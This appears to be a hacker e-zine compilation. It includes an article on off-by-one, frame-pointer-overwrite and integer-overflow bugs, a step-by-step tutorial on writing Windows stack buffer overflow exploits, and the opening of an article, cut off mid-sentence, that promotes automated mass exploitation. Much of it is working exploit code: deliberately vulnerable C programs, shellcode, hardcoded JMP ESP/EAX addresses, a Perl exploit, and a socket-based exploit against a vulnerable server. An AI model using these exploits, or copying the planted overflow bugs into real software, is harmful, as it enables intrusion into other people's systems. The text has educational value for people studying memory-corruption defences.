void LameFunc(char* Data) // some lame no-good function
{
char buffer[10];
strcpy(buffer,Data); // extremely simple b0f for demonstration purposes lol
return;
}
void SomeLoop(int Times,char* Data)
{
// The coder thinks that if Times is 0, the loop won't run since while(Times >
0) will be false
// the loop will however run at least 1 time, because of the Do statement, so
this is off-by-one
// this kind of error occurs quite often, but less obvious ofcourse
do {
LameFunc(Data);
Times--;
} while (Times > 0);
}

void Initialize() // initialize the 'users' which may only have numeric
usernames and passwords
{
UserArray[0].Username = ""123"";
UserArray[0].Password = ""321"";
UserArray[0].Access = 9; // number of times their loop will run
UserArray[1].Username = ""456"";
UserArray[1].Password = ""654"";
UserArray[1].Access = 1;
}

bool IsNoShellcode(char* Data) // checks if Data is numeric only
{
for(int i = 0; i < strlen(Data); i++)
if (((int)Data[i] > 57) || ((int)Data[i] < 48))
return false;
return true;
}

int Auth(char* User,char* Passwd) // checks if user and password are authed, if
so it returns the //number of times their loop will run, else it will return 0
since the coder is under the false //assumption the loop won't run at all if
Times is 0
{
for (int i = 0; i < UserCount; i++)
{
if((strcmp(UserArray[i].Username,User) == 0) &&
(strcmp(UserArray[i].Password,Passwd) == 0))
return UserArray[i].Access;
}
return 0;
}

int main(int argc, char *argv[])
{
if (argc != 4)
{
printf(""[?]Lameapp v1.0\nUsage: %s username password data\n"",argv[0]);
exit(-1);
}
Initialize();
//'Sanitize' input
for(int i = 0; i < (3-1); i++) // The coder thinks this will loop from 1 to 3,
but it will only loop //from 1 to 2 (fencepost error)
if(!IsNoShellcode(argv[i+1])) // 'avoid' shellcode in the buffers
exit(-1);
SomeLoop(Auth(argv[1],argv[2]),argv[3]);
return 0;
}

Ok, I hear everyone thinking WTF?! What is the PURPOSE of this app, good guess,
none, it's totally useless, but hey, it's an example and so is most software
nowadays. The apps works as follows:

lameapp.exe username password data

Assuming we can't read the passwords (we can't do DLL-injection on the app, we
can't reverse it,etc just ASSUME it for a second ) we don't have a valid login,
which is nothing to worry about, because the loop will run anyway, even if we're
unauthentificated (because of the do { } while off-by-one error). Then the
programmer tries to prevent shellcode being 'stored' in either of the arguments
(instead of just coding secure) by ""sanitizing"" the arguments, but the
sanitizing routine is off by one, since not elements m trough n are processed
but m trough n-1. Thus leaving the last argument argv[3] unsanitized, to store
our data. I know, this example is TOO obvious, but it is an illustration to
off-by-one errors. So exploiting this bitch wouldn't be hard. Assuming you know
how to exploit buffer overflows on the windows platform (if you don't read
either Tonto's articleb0f_1 or mineb0f_2 ) the exploit would look as follows:

#!/usr/bin/perl
my $ShellCode = ""\x33\xc0\xeb\x16\x59\x88\x41\x04\x50\x51\x51\x50\
xb8\x24\xe8\xd3\x77\xff\xd0\xb8\x63\x9


8\xe5\x77\xf f\xd0\xe8\xe5\xff\xff\xff\x68\x69\x32\x75\x4e"";

my $TargetApp = ""C:\\lameapp"";
my $OverflowString = ""\x90""x28;

my $JMPESP = ""\x24\x29\xD8\x77"";
my $XploitStr = $TargetApp."" 666 666 "".$OverflowString.$JMPESP.$ShellCode;
system($XploitStr);

Stack Frame pointer overwriting:

Another interesting case of off-by-one is stack frame pointer overwriting,
documented by Klog (http://www.phrack.org/phrack/55/P55-08). I'll describe the
basic aspects in a windows situation (yeah yeah call me names already) here.
Imagine a situation of the worst case, a buffer overflow in which you can only
overflow with ONE byte (off-by-one), how could this lead to us influencing the
code execution of the app? That'll be discussed here.
There are some differences between the linux (discussed by Klog) and windows
variant, with the windows variant having some drawbacks over the linux one.
There are a multitude of possible situations when it comes to stack frame
pointer overwriting, every situation having it's own unique traits. Since this
is a 'worst case scenario' exploit, exploitation will be quite difficult at
times.

Ok imagine (or just read ;p) this situation:

#include <stdio.h>
#include <cstdlib>
#define BUFFSIZE 1024
int main(int argc, char *argv[])
{
char buff[BUFFSIZE];
for (int i = 0; i <= BUFFSIZE; i++)
*(buff+i) = argv[1][i];
return 0;
}

Well, some people will say, what's the problem mate, you just take up till
BUFFSIZE, so all fits nicely! Well, upon closer examination they will be proven
wrong because the loop is off-by-one (because of the <= instead of just <). So
we have an overflow of exactly ONE byte, what's that gonna help us? Well, for an
answer to that let's look at the layout of the stack with such an app:

saved_eip
saved_ebp
char buffer[255]
char buffer[254]
...
char buffer[000]
int i

so if we overflow buffer with one byte, the last byte of the DWORD of the saved
ebp will be overwritten, thus we can trick the program into believing the
original EBP (saved in the function prologue: push EBP, MOV EBP,ESP) is our
(partially) overwritten value.

This action being followed by the function epilogue:

mov ESP,EBP
add ESP,4
pop EBP

(which is also LEAVE).

Now, we want ESP to point to the address of our shellcode (located in the
overflowing buffer), so since ESP will be EBP+4 so saved EBP should be the
address of our shellcode, 4. Since we cannot control the third byte of the saved
ebp , we can't make ESP hold the address of the start of our buffer, so we
should fill it with nops till the address we can make ESP hold.

Well when researching this vuln, I found some weird difference between
compilers. When compiled with VC6 or gcc, there seems to be no problem or
difference, but when compiled with Mingw, there is a problem which I'll discuss
in a minute.
Now take this app:

#include <stdio.h>
#include <cstdlib>
#define BUFFSIZE 1024

void Funk(char* bf)
{
char buff[BUFFSIZE];
for (int i = 0; i < (BUFFSIZE+9); i++)
*(buff+i) = bf[i];
}
int main(int argc, char *argv[])
{
Funk(argv[1]);
return 0;
}

This app differs from the first in one major concept, it doesn't do the real
for(i = 0; i <= BUFFSIZE; i++) what makes it off-by-one, but instead it will
copy till BUFFSIZE+9. This is because I first compiled my app with mingw, making
the stack layout look like:

saved_eip
saved_ebp
[Mr-x DWORD]
[Mr-x DWORD]
char buffer[255]
char buffer[254]
...
char buffer[000]
int i

there are two DWORDs of unknown purpose between our buffer and the saved EBP. I
first suspected them to be canary values, but since their content is static,
that's bullshit. I will talk about this later. As I already told you, there are
no such problems with VC6 or Gcc, this seems to be a mingw problem (thanks to
Tonto for verifying this).

The routine Funk (for a Mingw compiled program) looks like this when
disassembled:

00401290 /$ 55 PUSH EBP
00401291 |. 89E5 MOV EBP,ESP
00401293 |. 81EC 18040000 SUB ESP,418
00401299 |. C785 F4FBFFFF > MOV DWORD PTR SS:[EBP-40C],0
004012A3 |> 81BD F4FBFFFF > /CMP DWORD PTR SS:[EBP-40C],408
004012AD |. 7F 27 |JG SHORT a.004012D6
004012AF |. 8D45 F8 |LEA EAX,DWORD PTR SS:[EBP-8]
004012B2 |. 0385 F4FBFFFF |ADD EAX,DWORD PTR SS:[EBP-40C]
004012B8 |. 8D90 00FCFFFF |LEA EDX,DWORD PTR DS:[EAX-400]
004012BE |. 8B45 08 |MOV EAX,DWORD PTR SS:[EBP+8]
004012C1 |. 0385 F4FBFFFF |ADD EAX,DWORD PTR SS:[EBP-40C]
004012C7 |. 0FB600 |MOVZX EAX,BYTE PTR DS:[EAX]
004012CA |. 8802 |MOV BYTE PTR DS:[EDX],AL ; move bf[i] into buffer[i]
004012CC |. 8D85 F4FBFFFF |LEA EAX,DWORD PTR SS:[EBP-40C]
004012D2 |. FF00 |INC DWORD PTR DS:[EAX]
004012D4 |.^EB CD \JMP SHORT a.004012A3
004012D6 |> C9 LEAVE
004012D7 \. C3 RETN

and like this when compiled with gcc:

004012C3 |. C745 F4 000000> MOV DWORD PTR SS:[EBP-404],0
004012CA |> 817D F4 FF0300> /CMP DWORD PTR SS:[EBP-404],3FF
004012D1 |. 7F 15 |JG SHORT a.004012E8
004012D3 |. 8D45 F8 |LEA EAX,DWORD PTR SS:[EBP-400]
004012D6 |. 0345 F4 |ADD EAX,DWORD PTR SS:[EBP-404]
004012DE |. C600 41 |MOV BYTE PTR DS:[EAX],41
004012E4 |. FF00 |INC DWORD PTR DS:[EBP-404]
004012E6 |.^EB E2 \JMP SHORT a.004012CA

As can be seen in the hex dump around buffer in OllyDBG when going trough this
routine:

00 00 05 00 00 00 41 41 #...AA
41 41 41 <junkjunkjunk> AAA

the 05 00 00 00 is a DWORD reservated for int i, after that buffer is located,
with junk after it, that is to be overwritten with the data to be stuffed into
the buffer. And this will eventually overwrite the last byte of the saved ebp
(in the case of a mingw compilation with the byte at position (1024 + 9) else
with the byte at position (1024 + 1) inside argv[1]). Now look at a part of the
disassembled Main:

0040130D |. E8 7EFFFFFF CALL a.00401290
00401312 |. B8 00000000 MOV EAX,0
00401317 |. C9 LEAVE
00401318 \. C3 RETN

Ok, now take a carefull look at the registers as we move trough our apps'
execution:

Before the LEAVE in Funk, EBP is 0x0022FF58 (points to saved_ebp) after the
LEAVE,EBP is 0x0022FF<overflowing byte here> (while it should be 0x0022FF78) and
ESP is changed 0x0022FF5C ( 0x0022FF58 + 4). Now if we continue execution until
just after Main's LEAVE (in the example at 0x00401317) we can see that ESP is
now 0x0022FF<overflowing byte + 4), and EIP will be popped from that address, so
we have our exploitable condition! Our initial overflowing buffer should look
like:

In case of a mingw compilation:
[""\x90""x1024] + [""\x90"" x 8] + [overflowing byte]
In case of a gcc compilation:
[""\x90""x1024] + [overflowing byte]

Now we should let the overflowing byte point somewhere in the middle of our
buffer. Keep in mind that that byte will be increased with 0x04 though in ESP.
In this case 0x01 should suffice, becoming 0x05 in ESP.

Then, at that address (in our buffer: 0x0022FF05) we should have the address of
the start of our shellcode, that will be popped into EIP. So we should have the
following exploitation buffer:

[Shellcode][addr of Shellcode][overflowing nops (if necessary)][overflowing byte
pointing to the addres of [addr of Shellcode]]

There is are several issues with this exploitation method on windows though. Due
to buff being declared in Func, it might have it's data partially overwritten
(due to windows' relative addressing method), rendering this exploit useless. I
told you there are some major differences in exploitation on windows and linux
(as always >.>) and this is a large drawback because we this REALLY makes this a
worst case scenario. The other (and probably biggest) drawback are the two
strange DWORDs between the saved EBP and our buffer on a Mingw compilation. This
means we must be very careful at looking what compiler what used to compile the
app before drawing conclusions about potential exploitable content.

Integer overflows:

Integer overflows are misunderstood bugs. They are relatively rare, but not in
the sense of occurance but in the sense of discovery. They are often overlooked
or just neglected due to the lack of exploitation knowledge. Well, integer
overflows basically consist of increasing an integer beyond it's maximum
capacity, thus sometimes causing exploitatable behavior. Ok, look at the
following min and max value table of several data types:

So, let's look at the next aritmetic example:

int main(int argc,char* argv[])
{
byte a = 0xFF;
a += 0x1;
return 0;
}

running this app in a debugger would reveal to us what you might have suspected.
Since 0xFF is 255 but also (in case of an unsigned 8-bit value) -1. So adding 1
to 0xFF (being the max value of a byte) makes -1 + 1 = 0. This can be abused for
our own purposes. Imagine the following app vulnerable to a simple b0f:

int main(int argc,char* argv)
{
char buffer[20];
if(argc != 3)
exit(-1);
int i = atoi(argv[2]);
unsigned short s = i;
if (s > 19) // 'prevent' b0f
exit(-1);
strncpy(buffer,argv[1],i);
return 0;
}

This is indeed an extremely gullible app, trusting the user with inputting the
length of the data, but these constructs occur more often than you think, more
obscurely and complex yes, but they occur nontheless. Now, this app checks if s
is bigger than 19, which would cause a potential b0f, so it 'prevents' it this
way. What's wrong though is this line:

unsigned short s = i;

since atoi returns a signed 32-bit int which can hold up to 2,147,483,647 and an
unsigned short can only hold up to 65,535, thus we could input 65,536 in
argv[2], overflowing s (and setting it to 0) bypassing the bounds checking and
overflowing the buffer anyway.

Now, the following example will incorporate several vulnerablilities in one app:

char* UserBuffer = (char*)malloc(10);
int TrustedData = (int)malloc(4);
memcpy(&TrustedData,&SomeTrustedSource,4);
int len = atoi(argv[2]);
short l = len; // [V1]
if(l > 9) // [V1.5]
exit(-1);
strncpy(UserBuffer,argv[1],len); //[V2]
if (TrustedData + SomeUserSuppliedValue > SomeLimit) // [V3]
DoSomethingElse()

Ok, the first vuln lies with [V1], where len is converted to a short from an
int, like discussed earlier this can help us bypass the boundschecking at [V1.5]
and copy more data to UserBuffer [V2] than it can handle and heap overflow
TrustedData (we should copy (addr of TrustedData's allocated area), (addr of
UserBuffer's allocated area) bytes to UserBuffer and all data after that will
overwrite the data in TrustedData, which is assumed to originate from
SomeTrustedSource. We can for example exploit this as a signedness error, Making
TrustedData negative, thus bypassing the boundschecking at [V3], and potentially
overflowing data that relies on SomeUserSuppliedValue as a limit.

Outro:
Well, I hope you liked the article and learned something new from it. And
remember, 0-days are 0-days, don't make them public
Anyways, shouts go to the whole HackThisSite cast & crew , .aware community, ASO
community and vx.netlux.org peeps.

Nomenumbra

################################################################################
#            'This Reminds Me of the Time I Slept With Your Mother'            #
#            And Other Interesting Windows Buffer Overflow Stories             #
################################################################################
  ____________________________________________________________________________
//                                                                            \\
|| This article will force the concept of a buffer overflow into your skull,  ||
|| and teach you to code buffer overflow exploits on Windows. Every article   ||
|| that exists on the internet teaches is a walkthrough from really basic ASM ||
|| to simple BOF for a *nix machine, and it can be difficult to get a simple  ||
|| ""Hello World"" in Windows vuln dev to work. I have not before found an      ||
|| article which analyzes buffer overflows for Windows as 'Smashing the Stack'||
|| [3] for *nix, and documents like 'The Tao of the Windows Buffer Overflow'  ||
|| [2] can be difficult to follow if one does not have experience doing them  ||
|| on a *nix platform.                                                        ||
\\____________________________________________________________________________//

This article is really pretty detailed, but regardless, it may help to know a
few things before reading this paper. Some basic details about C programming and
some very simple ASM knowledge will help. Things such as how the EBP and ESP
registers function in relation to a functions stack frame and how some ASM
instructions manipulate the call stack. Every tutorial in the world tells you 
exactly what these things do and there is plenty of documentation. 

So I am going to give as little background as possible with these aspects, and
focus on the less often addressed aspect of how to do a buffer overflow exploit
on Windows. If you do not have any  background, and may have scrolled down and
found a lot of what is written sounds like a foreign language, then I you might
find the information from 'Smashing the Stack' [3] could be valuable
prerequisite reading, especially information before the section about writing
shell code.

Also, I can suggest the IA-32 Developer's Manual Vol. 1 to teach yourself. All
of Chapter 6 of the manual devoted to explain how calling conventions work, how
the stack is set up, and other useful information. It can be found here:

http://www.intel.com/design/pentium4/manuals/index_new.htm
ftp://download.intel.com/design/Pentium4/manuals/25366519.pdf

Don't let this seem too daunting, you will hopefully be able to find most of the
concepts pretty simply. So let us jump right into things. Here's some simple
code that will crash because it overwrites special memory, used to control
execution, on the stack.

================================================================================

#include <string.h>

void copy(char *s) 
{
	char buf[256];
	strcpy(buf, s);
}

int main()
{
	char buffer[512];

	for(int i = 0; i < 512; i++)
		buffer[i] = 'X';

	copy(buffer);
	return 0;
}

================================================================================

The function copy(char*) makes a very careless mistake. It is a useless
function, which copies one string to another. Unfortunently, the source string
is larger than the local one, and writes into special memory which it shouldn't
touch. Here is how our program's stack memory looks before the strcpy happens:



/-------------------------\
|                         |  lower
|                         |  memory
|        256 buffer       |    
|   [hfsdkfhakjlasghkdl]  |    /\
|                         |   /__\
|       0xEBP - 0xRET     |    ||
|                         |    ||
|   copy()'s stack frame  |    ||
|-------------------------|    ||
|          args           |    ||
|-------------------------|    ||
|                         |    ||
|        512 buffer       |    ||
|   [XXXXXXXXXXXXXXXXXX]  |    ||
|   [XXXXXXXXXXXXXXXXXX]  |    ||
|                         |    ||
|       0xEBP - 0xRET     |    
|                         |  higher
|   main()'s stack frame  |  memory
\------------------------/  



When strcpy tries to copy the 512 byte buffer into the 256 byte buffer, some
funny things happen. It disregards that the destination is too small, and
overwrites the RET address and the saved EBP. So then it kinda looks like (58 is
the ASCII value of 'X')


/-------------------------\
|                         |  lower
|                         |  (top)
|        256 buffer       |
|   [XXXXXXXXXXXXXXXXXX]  |    /\
|    0x585858, 0x585858   |   /__\
|                         |    ||
|   copy()'s stack frame  |    ||
|-------------------------|    ||
|          args           |    ||
|-------------------------|    ||
|                         |    ||
|                         |    ||
|        512 buffer       |    ||
|   [XXXXXXXXXXXXXXXXXX]  |    ||
|   [XXXXXXXXXXXXXXXXXX]  |    ||
|       0xRET - 0xEBP     | 
|                         | (bottom)
|   main()'s stack frame  |  higher
\------------------------/  


This represents how the RET address is overwritten. strcpy runs past the ends of
our 256 byte buffer, and overwrites the EBP and EIP. So now, when the function
tries to return from the function calling the RETN instruction in assembly, it
pops 0x58585858 into EIP which is invalid, and the program crashes. You can see
this by checking the registers. This opens up some possibilities for us. We
could potentially overwrite the EIP with anything that we want, have it go
execute whatever code we wanted, and hijack the flow of the program.

All this, you may have already known. But, there are several things on the
Windows platform that change the circumstances of this. To see what we are going
to do now, let's take a close look at copy()'s stack frame.

<lower                                     <higher
 memory>                                    memory>
 [ESP                                         EBP]
  ||                                           ||
  \/                                           \/

[data, including the buffer, on stack] [saved ebp] 
[ret] [args] [main()'s stack frame =>]
  ^
  |
<< target >>



In this problem, we have almost full control over the stack. strcpy will copy
any data that we want onto the stack, provided it does not contain any null
bytes (which strcpy see's as the end of a string). So now, let's take a look at
this vulnerable function after compilation. Compiled with VC++ and trimming the
fat which initializes data on the stack and saves registers:

================================================================================

PUSH EBP
MOV EBP,ESP
SUB ESP,140

MOV EAX,DWORD PTR SS:[EBP+8]
PUSH EAX
LEA ECX,DWORD PTR SS:[EBP-100]
PUSH ECX
CALL main.strcpy
ADD ESP,8

ADD ESP,140
MOV ESP,EBP
POP EBP
RETN

================================================================================

So, essentially, we have control over all the memory from EBP-100 and up,
because strcpy does not check whether the buffer is large enough. So now we need
to hijack the program by overwriting the RET which is at EBP+4 and making it EIP
return to somewhere else. The way I am presenting is the most basic was we can
do this, but this concept may be sort of abstract for you autistic kiddo's, so
read carefully.

If we can find where the RET is on the stack, we can overwrite it with whatever
we want and alter the flow of execution. If all was perfect, we could make it
point right to our shellcode. But we may not know the exact address of our
shellcode on the stack, so this might be difficult. So, what we can do, is make
the RET jump to an instruction, which will take the form of

JMP/CALL <SOMEREGISTER>

Where SOMEREGISTER is a register like EAX, ESP, EBX, as close to your shellcode
as possible. In our code, for example, we are very lucky in that the function
strcpy(..) returns a pointer to the destination buffer, which we have control
over, and return values are in EAX. So, we need to find an instruction that is
JMP EAX or CALL EAX. 

One way that we can do this is by using the OLLYUNI plug-in
(http://www.phenoelit.de/win/index.html)

To use, put the plug-in DLL in the same dir as the Olly executable, start up the
debug, right click the disassembly window, and go to Overflow Return Address,and
then select ASCII Overflow Returns, and then JMP/CALL EAX. It will freeze for
awhile trying to search for the instruction in memory, but then finish after
about a minute. Then, right click again, and write the values to a file, and it
will show you the address of an instruction in memory. You will want to choose a
value that is in a loaded DLL. I, for example, found one at 0x7C816353 in
kernel32.dll. 

================================ NOTE NOTE NOTE ================================
--------------------------------------------------------------------------------
| The address of such an instruction on your machine may not match mine!       |
|                           Search for yourself!                               |
--------------------------------------------------------------------------------

So here's how the stack is laid out. We are going to write past the end of the
buffer, to the RET value, and overwrite the RET with the address of a JMP / CALL
EAX instruction:


[ (..... EBP-100 .....) (... EBP ...) (... EBP + 4 ...) ]
   ^                                 
   |    < Buffer -------> Saved EBP --------> RET >
   |                                           |
   |___________________________________________|


So, I needed 104h, 260, bytes of junk, before I get to the RET. If for some
reason your situation is different you can start small and keep adding onto the
end of a buffer filled with your data, to make the program crash and determine
the size of the buffer, keeping an eye on EIP when it is crashing. Then, you can
replace the end of it with the address of your JMP EAX instruction. The scene of
the crime:

================================================================================

#include <string.h>

void copy(char *s) 
{
	char buf[256];
	strcpy(buf, s);
}

int main()
{
	char buffer[512];

	for(int i = 0; i < 260; i++)
		buffer[i] = 'X';

	*(int *) (buffer + 260) = 0x7C816353;

	copy(buffer);
	return 0;
}

================================================================================

It worked first try, and redirected execution to where all those 'X's were. So,
what if we replaced that with some executable code instead of some 'X's? This is
called shellcode. It consists of some compiled opcodes that we throw into the
gearworks of a vulnerable program to make it do what we want. For simplicity and
because some useful shellcode is outside the scope of this article, let's just
make some very simple shellcode.

================================================================================

#include <windows.h>

int main()
{
	MessageBox(0, 0, 0, 0);
	ExitProcess(0);

	return 0;
}

================================================================================

Then, debug the program, step into it, and see where it takes you off to. The
base address that the DLL is loaded at varies in different Windows
distributions, and makes this shellcode very unportable The address you find
will probably different, but stepping through the program, I found that
ExitProcess is at 0x7c81caa2 and MessageBox at 0x77d804ea.

================================ NOTE NOTE NOTE ================================
--------------------------------------------------------------------------------
| The address of such an instruction on your machine may not match mine!       |
|                           Search for yourself!                               |
--------------------------------------------------------------------------------

The address of such an instruction on your machine may not match mine! Search
for yourself! So here's what I made. A simple shellcode, this is not the point
of the tutorial. See Delikon's Windows shellcode-picture Book
(http://www.delikon.de/shellbuch/eng/1.html) for more info on this very basic
technique for making Windows shellcode. 

================================================================================

; Assembles NASM -fbin prog.asm

[BITS 32]
start:
	xor edx, edx         ; Avoids NULL byte
	push edx             ; MsgBox type
	push edx             ; MsgBox body
	push edx             ; MsgBox caption
	push edx             ; Owner hWnd
	mov eax, 0x77d804ea  ; Addr of MessageBox, USER32 should be loaded
	call eax

	xor eax, eax         ; Avoids NULL byte     
	push eax             ; Exit code
	mov eax, 0x7c81caa2  ; Addr of ExitProcess, KERNEL32 should be loaded
     	call eax

================================================================================

I then extract the shellcode from the compiled program, using a program or a hex
editor. It corresponds to the opcodes which would make a message box saying
error pop up, and then exit. So now I make a small program which will put our
shellcode at the start of the buffer that we control, and then jump to the start
of it using a JMP EAX call.

================================================================================

#include <string.h>
#include <stdio.h>

char shellcode[] = 
	""\x31\xD2\x52\x52\x52\x52\xB8\xEA\x04\xD8\x77\xFF""
	""\xD0\x31\xC0\x50\xB8\xA2\xCA\x81\x7C\xFF\xD0"";

void copy(char *s) 
{
	char buf[256];
	strcpy(buf, s);
}

int main()
{
	char buffer[512];

	for(int i = 0; i < 260; i++)
		buffer[i] = 'X';

	//
	// Shellcode placed at start of exploit buf
	// 0x7C816353 is a JMP EAX instruction
	//

	memcpy(buffer, shellcode, strlen(shellcode));
	*(int *) (buffer + 260) = 0x7C816353;

	copy(buffer);
	printf(""If we got here, it didn't exit like it should have"");
	return 0;
}

================================================================================

This is how our specially crafted exploit buffer looks when laid out next to the
actual memory


exploit: < shellcode >  < xxxxxxxxxxxxxxxxxxxxxxxxxxxxx > < altered RET >  \
memory : < bufferbufferbufferbufferbuffer > < saved EBP > < real RET >     /
                                                                           

The result it returns to our altered RET address, JMP EAX takes us back to our
shellcode. There is another register which allows our shellcode to be executed
if we alter our program. We can have our program JMP ESP, This happens to work
out very nicely. Let me show you the example and explain it afterwards.

================================================================================

#include <string.h>
#include <stdio.h>

char shellcode[] = 
	""\x31\xD2\x52\x52\x52\x52\xB8\xEA\x04\xD8\x77\xFF""
	""\xD0\x31\xC0\x50\xB8\xA2\xCA\x81\x7C\xFF\xD0"";

void copy(char *s) 
{
	char buf[256];
	strcpy(buf, s);
}

int main()
{
	char buffer[300];
	for(int i = 0; i < sizeof(buffer); i++)
		buffer[i] = 'X';

	//
	// 0x7C82385D is a JMP ESP instruction
	// Shellcode placed after overflowed RET
	//

	*(int *) (buffer + 260) = 0x7C82385D;
	memcpy(buffer + 264, shellcode, strlen(shellcode));

	copy(buffer);
	printf(""If we got here, it didn't exit like it should have"");
	return 0;
}

================================================================================

Now let's look at the stack right as the function is going to return. Right as
this code is going to execute, and the stack around this area. ESP value next to
instruction indicates the value of ESP after it has executed.

MOV ESP,EBP ; ESP = 0012FDF8
POP EBP     ; ESP = 0012FDFC
RETN        ; ESP = 0012FE00

0012FDF8   58585858 << This is the EBP we overwrote with 'X's
0012FDFC   7C82385D << This is the RET to the JMP ESP, which is now 0012FE00
0012FE00   5252D231 << This is the start of the shellcode immediately after
0012FE04   EAB85252 
0012FE08   FF77D804
0012FE0C   50C031D0
0012FE10   81CAA2B8
0012FE14   58D0FF7C
0012FE18   58585858

So ESP and EBP start there right before the RET. Then 58585858 is POP'ed into
EBP, and our new RET is RETN'ed and goes to JMP ESP. At that point, ESP is has
also been decremented, and now points to our shellcode immediately following the
RET. Convenient! I think we are ready to attack our first application. It is a
wimp, and I think you can do it. Here's the vulnerable little thing

================================================================================

#include <string.h>

int main(int argc, char ** argv)
{
	char buf[256];
	if(argc == 2)
		strcpy(buf, argv[1]);
}

================================================================================

The exploit program only adds one more dimension to our existing programs; now
we have a JMP ESP instruction pointer, and our shellcode is placed right after
it. I then start up our vulnerable program, with our specially crafted buffer as
the argument, with ShellExecuteEx.

================================================================================

#include <string.h>
#include <windows.h>

char shellcode[] = 
	""\x31\xD2\x52\x52\x52\x52\xB8\xEA\x04\xD8\x77\xFF""
	""\xD0\x31\xC0\x50\xB8\xA2\xCA\x81\x7C\xFF\xD0"";


int main()
{
	char buffer[300];
	for(int i = 0; i < sizeof(buffer); i++)
		buffer[i] = 'X';

	*(int *) (buffer + 260) = 0x7C82385D;
	memcpy(buffer + 264, shellcode, strlen(shellcode));


	SHELLEXECUTEINFO info = { 0 };
    
	info.cbSize       = sizeof(info); 
	info.lpVerb       = ""open"";
	info.lpFile       = ""c:\\vuln.exe"";
	info.lpParameters = buffer;
	info.nShow        = SW_SHOW;
    
	ShellExecuteEx(&info);
	return 0;
}

================================================================================

If it worked, you're practically ready to exploit a real program. 

So, let's say retard coded this stupid 'server' if you could call it that. Make
sure to link ws2_32.lib when compiling a winsock enabled application.

================================================================================

#include <winsock2.h>
#include <stdio.h>

int main(int argc, char ** argv)
{
    char         buf[256];
    WSADATA      wsaData;
    SOCKET       hSock;
    SOCKET       hClient;
    SOCKADDR_IN  server;
    

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    hSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(1337);

    bind(hSock, (sockaddr *) &server, sizeof(server));
    listen(hSock, 1);

    hClient = accept(hSock, NULL, NULL);

    if(hClient != INVALID_SOCKET)
    {
        int  ret;
        printf(""client accepted\n"");

        while(ret = recv(hClient, buf, 512, 0))
        {
            if(ret == SOCKET_ERROR)
            {
                printf(""%d\n"", WSAGetLastError());
                break;
            }
            else
                buf[ret] = 0;
        }
    }

    closesocket(hClient);
    closesocket(hSock);

    WSACleanup();
    return 0;
}

================================================================================

Clearly biting off more than it can chew in it's call to recv. With just a
little socketry you can take the offensive and make the 'server' do whatever you
want.

================================================================================

#include <windows.h>
#include <stdio.h>

char shellcode[] = 
	""\x31\xD2\x52\x52\x52\x52\xB8\xEA\x04\xD8\x77\xFF""
	""\xD0\x31\xC0\x50\xB8\xA2\xCA\x81\x7C\xFF\xD0"";


int main()
{
	char          buffer[300];
	SOCKET        hSock;
	SOCKADDR_IN   client;
	WSADATA       wsaData;

	for(int i = 0; i < sizeof(buffer); i++)
		buffer[i] = 'X';

	*(int *) (buffer + 260) = 0x7C82385D;
	memcpy(buffer + 264, shellcode, strlen(shellcode));


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	hSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(""127.0.0.1"");
	client.sin_port = htons(1337);

	if(connect(hSock, (sockaddr *) &client, sizeof(client)) == SOCKET_ERROR) 
	{
		printf(""Failed\n"");
		WSACleanup();
		return 0;
	}

	send(hSock, buffer, sizeof(buffer), 0);
	closesocket(hSock);

	WSACleanup();
	return 0;
}

================================================================================

Conclusion: I hope to follow up this article with a subsequent one's discussing
frame pointer overwrites, frame based exception handler absuse, shellcoding, and
the parallel universe of heap overflows. 
    ______________________________
  /|..............................|
 | |:                            :|
 | |:                            :|
 | |:      ,-.   _____   ,-.     :|
 | |:     ( `)) [_____] ( `))    :|
 |v|:     `-`   ' ' '   `-`      :|
 |||:      ,______________.      :|
 |||....../::::o::::::o::::\......|
 |^|...../:::O::::::::::O:::\.....|
 |/`----/--------------------`----|
 `.____/ /====/ /=//=/ /====/_____/
       `--------------------'

Tools:

 [A] http://msdn.microsoft.com/vstudio/express/visualC/default.aspx
	- MSVC++ 2005

 [B] http://nasm.sourceforge.net/
	- Netwide Assembler

 [C] http://www.ollydbg.de/
	- OllyDbg Debugger

 [D] http://www.phenoelit.de/win/
	- OllyUni, an OllyDbg plug-in

References:

 [1] http://www.delikon.de/shellbuch/eng/1.html 
	- The great Windows-Shellcode picture book

 [2] http://www.cultdeadcow.com/cDc_files/cDc-351/
	- Tao of the Windows Buffer Overflow

 [3] http://www.insecure.org/stf/smashstack.txt 
	- Smashing the Stack for Fun and Profit

 [4] http://www.securitycompass.com/Case%20Studies.htm 
	- Writing Stack Based Overflows on Windows

 [5] http://www.intel.com/design/pentium4/manuals/index_new.htm
	- IA-32 Developer's Manual Vol. 1 - Chapter 6


Thoughts for the future

 - http://www.blackhat.com/presentations/win-usa-02/halvarflake-winsec02.ppt
	- Third Generation Exploitations

 - http://www.phrack.org/phrack/55/P55-08
	- Frame Pointer Overwrite

 - http://www.cybertech.net/~sh0ksh0k/heap/
	- Windows Heap Overflow Presentation

 - http://www.hick.org/code/skape/papers/win32-shellcode.pdf
 
################################################################################
#               Deus Ex Machina: Notes on the Artificial Hacker                #
################################################################################
(code and other files associated with nomenumbra's article are located at
http://www.hackbloc.org/zine/vivalarevolution.rar - pass is 'anarchism')

[0x00] Intro
Well ladies and gentlemen, here I am again to bore you . This time with an
article on the increasingly populair concept of an ""artificial hacker"". When
thinking of an ""artificial hacker"" I don't mean some uberly complex neural
network that analyzes source-code for potential vulnerabilities and writes
exploits for them . I'm ""merly"" talking about an automated framework for
mass-exploitation of certain vulnerabilities.
As described in the articles ""Automation"" (located here:
http://blackhat.com/presentations/bh...-sensepost.pdf) and ""Moving towards the
Artificial Hacker"" (located here:
http://felinemenace.org/papers/Movin...hley_Fox.p pt
) there are many pros and cons for this concept. Pentesting/Attacking would be
made much easier and a lot of the boring work would be taken from the hacker,
allowing him some time for a beer.
Of course this sound pretty tame and all, and my quick implementation might not
be the best, but the concept surely is powerfull as hell. Imagine a huge
exploitDB (like milw0rm's of securityforest's linked to A/APE, which would
(providing it has a dork for every vuln (or it could scan random ip-ranges))
exploit the fuck out of the net, pwning vulnerable box after vulnerable box,
while the ""only thing"" the controlling hacker has to do is find exploits and
write A/APE modules and supply them to the engine, rooting an astronomical
ammount of boxes in no-time (providing he/she has multiple A/APE scripts
running).
The idea of an automated exploitation framework crossed my mind when working on
